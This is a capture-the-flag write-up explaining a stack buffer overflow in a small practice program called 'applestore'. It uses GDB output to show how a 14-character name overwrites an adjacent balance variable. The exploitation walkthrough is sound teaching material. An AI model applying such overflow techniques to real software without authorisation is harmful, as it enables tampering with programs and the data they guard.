# applestore
## slopey | 2/22/2020

# Introduction
We are given a simple executable where we can enter our name and whether or not we want to buy an iPhone.
```
---------------------------
Welcome to the Apple Store!
---------------------------
Enter your name: slopey
Would you like to buy an overpriced phone with a garbage operating system for $45,555? (y/n): y

Unfortunately you do only have $32. You should use Linux anyways...
```
However, it seems like no matter what we input, we do not have enough money in our balance to purchase an iPhone. The goal of this task is to manipulate our balance in order to have sufficient funds to purchase an iPhone.

# Code Analysis
First, variables are declared at the very top.

```c
char name[8];
int choice;
long balance = 32;
```

As you can see, our balance is initialized to 32, which explains why we don't have enough money to purchase an iPhone.

Next, we enter our name and whether we want an iPhone.

```c
printf("Enter your name: ");
fgets(name, 16, stdin);

printf("Would you like to buy an overpriced phone with a garbage operating system for $45,555? (y/n): ");
choice = getchar();
puts("");
```

If we don't want an iPhone, the program terminates, so we have no option but to say yes.

```c
if (choice == 'n') {
    puts("Leave.");
    exit(0);
}
```

If we say yes and our balance is more than $45,555, we are given the iPhone. Otherwise, the program terminates.

```c
if (balance > 45555) {
    puts("Congragulations! You are now the proud owner of an iPhone!");
    exit(0);
} else {
    printf("Unfortunately you do only have $%d. You should use Linux anyways...\n", balance);
    exit(0);
}
```

# Vulnerability

A vulnerability exists when the name is read from stdin. Although name is allocated to be 8 bytes, fgets reads in 16 bytes, leading to a buffer overflow.

# Exploitation

First, let's examine the program's memory using GDB. I set a breakpoint at the very last instruction, right before the program terminates. This tells GDB to stop code execution right before the program finishes, so we can get an accurate portrait of memory. If we set a breakpoint at the very beginning of the code, nothing has happened, so memory will be filled with irrelevant information.

Also, note that I'm using the `gef` extension for gdb so all of my terminal output begins with `gef➤ ` instead of `(gdb)`. 

In order to set a breakpoint at the last instruction of the code, let's first disassemble the `main` function. 

```
gef➤  disas main
<---cut for brevity--->
   0x000000000040123c <+214>:	mov    edi,0x0
   0x0000000000401241 <+219>:	call   0x401070 <exit@plt>
```


Before we go any further, I want to briefly explain what disassemblies are. Recall from earlier that the C code provided was semi-readable. That is to say, even from the perspective of someone who doesn't know how to program, the C code was more or less understandable. Also, know that the CPU is the component in computers which execute code. However, the CPU does not understand C code. There must be a transitionatory stage where the C code is compiled to assembly code, a language that the CPU understands. The disassembly is simply the assembly code that the C code was converted to.

Now, let's set a breakpoint at the last instruction.

```
gef➤  b *0x0000000000401241
Breakpoint 1 at 0x401241
```

Next, we can run the program and it will stop right before the program terminates.

```
gef➤  r
Starting program: /home/slopey/Documents/ehc/applestore/applestore
---------------------------
Welcome to the Apple Store!
---------------------------
Enter your name: slopey
Would you like to buy an overpriced phone with a garbage operating system for $45,555? (y/n): y

Unfortunately you do only have $32. You should use Linux anyways...

Breakpoint 1, 0x0000000000401241 in main ()
```

Reaching the end, we can now inspect what the memory of the program looks like right before the program terminates.

```
gef➤  x/20gx $rsp
0x7fffffffe7e0:	0x0000000000000000	0x706f6c7300401080
0x7fffffffe7f0:	0x00000079000a7965	0x0000000000000020
0x7fffffffe800:	0x0000000000000000	0x00007ffff7e06b25
0x7fffffffe810:	0x00007fffffffe8f8	0x00000001f7fca000
0x7fffffffe820:	0x0000000000401166	0x00007fffffffeb69
0x7fffffffe830:	0x0000000000401250	0xe3c14b474c5dae0a
0x7fffffffe840:	0x0000000000401080	0x0000000000000000
0x7fffffffe850:	0x0000000000000000	0x0000000000000000
0x7fffffffe860:	0x1c3eb4b89c7dae0a	0x1c3ea48799e9ae0a
0x7fffffffe870:	0x0000000000000000	0x0000000000000000
```

Let me briefly explain what the command I typed means. First, recall that rsp is a register which contains the address of the top of the stack. We can inspect the value of the rsp register like so:

```
gef➤  info register rsp
rsp            0x7fffffffe7e0      0x7fffffffe7e0
```

As you can see, this means that the top of the stack is the address `0x7fffffffe7e0`. Note that this value is written in base-16. In decimal form, this number can be represented as 140737488349152. The `x` command is used to inspect memory. The syntax of the `x` command is like this: `x/<width><size><format> address`.

The format is the representation of the values. In this case, I use the format `x` to represent the values in hex. Alternatively, I can use the format `d` to represent the values in decimal, or the format `s` to represent the values in English.

The size field only applies when the format is `x`. The size field dictates how many bytes are in each "block" as seperated by whitespace. `g` means 8 bytes (AKA doubleword), `w` means 4 bytes (AKA word), `h` means 2 bytes (AKA half) and `b` means 1 byte (AKA byte). 

Finally, the width is the number of blocks. Putting it all together, this means that the command `x/20gx $rsp` means to display 20 8 byte blocks in hex form starting from the address contained in the rsp register.

First, let's try to find where my name is in memory. This is where recognizing ASCII is helpful. ASCII is how English is represented in base-16. Once you get the hang of it you can tell if memory is either random irrelevant stuff or English text. In this case, I can tell that my name is likely at the address `0x7fffffffe7ec`. I can make sure by running the command:

```
gef➤  x/s 0x7fffffffe7ec
0x7fffffffe7ec:	"slopey\n"
```

Of course, this might be a little difficult at first. The other way is to just use the built-in command `find` like so:

```
gef➤  find $rsp, +0x400, "slopey\n"
0x7fffffffe7ec
1 pattern found.
```

You have to add a newline character "\n" to the end of your search parameter because fgets includes the newline.  The syntax of the find command is like so: `find <start address>, +<length>, <expression>`.

Let's also figure out where the balance is.

```
gef➤  find $rsp, +0x400, 32
0x7fffffffe7f8
1 pattern found.
```

We can find the distance between these two variables in memory by doing the following:

```
gef➤  p 0x7fffffffe7f8 - 0x7fffffffe7ec
$3 = 0xc
```

0xc is 12 in hex. We know that fgets lets us read in 16 characters. So, as long as our name is at least 12 characters, we have overflowed the balance! We can verify this by entering a 12-character long name.

```
[slopey@mariner applestore]$ ./applestore
---------------------------
Welcome to the Apple Store!
---------------------------
Enter your name: AAAAAAAAAAAA
Would you like to buy an overpriced phone with a garbage operating system for $45,555? (y/n): y

Unfortunately you do only have $10. You should use Linux anyways...
```

Look! We were able to change our balance to $10! The reason the balance is now $10 is because the newline character, "\n", is now at the balance variable. The actual length of our name is 13; 12 bytes of As and 1 byte of newline. The decimal representation of "\n" is actually 10. 

Simply having a longer name gives us the intended result:

```

pey@mariner applestore]$ ./applestore
---------------------------
Welcome to the Apple Store!
---------------------------
Enter your name: AAAAAAAAAAAAAA
Would you like to buy an overpriced phone with a garbage operating system for $45,555? (y/n): y

Congragulations! You are now the proud owner of an iPhone!
```
